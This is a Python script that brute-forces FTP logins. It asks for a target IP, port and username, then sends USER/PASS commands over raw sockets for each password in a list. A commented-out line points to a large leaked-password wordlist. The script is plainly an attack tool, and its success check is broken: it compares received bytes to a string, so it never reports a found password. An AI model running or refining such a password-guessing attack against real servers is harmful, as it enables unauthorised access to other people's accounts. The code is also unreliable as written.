#! usr/bin/python3

import socket
import sys
from bs4 import BeautifulSoup
import urllib.request

def read_text(file_name):
    file_data = []
    url = file_name
    uf = urllib.request.urlopen(url)
    html = uf.read()
    soup = BeautifulSoup(html, 'html.parser')
    raw = soup.get_text()
    for word in raw.split():
        file_data.append(word.encode('utf-8'))
    return file_data

def connect(password, ip, port, i, n):
    data2 = keyword1 + password + keyword2
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Attempting password", i, "of", n)
    soc.connect((ip, port))
    data = soc.recv(1024)
    soc.send(data1)
    data = soc.recv(1024)
    soc.send(data2)
    data = soc.recv(3)
    soc.send(quitmsg)
    soc.close()
    return data

quitmsg = "QUIT\r\n".encode('utf-8')
username = input("What is the username?\n")
data1 = ("USER " + username + "\r\n").encode('utf-8')
ip = input("Enter the FTP Server IP (without port): \n")
keyword1 = "PASS ".encode('utf-8')
keyword2 = "\r\n".encode('utf-8')
port = int(input("Enter the port number: \n"))
#passwords = read_text('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-dup.txt')
passwords = ["matthew1".encode('utf-8'), "matthew2".encode('utf-8')]
i = 1
n = len(passwords)
# print(passwords)
for password in passwords:
    attempt = connect(password, ip, port, i, n)
    i += 1
    if(attempt == "230"):
        print("Password found:", password)
        sys.exit(0)
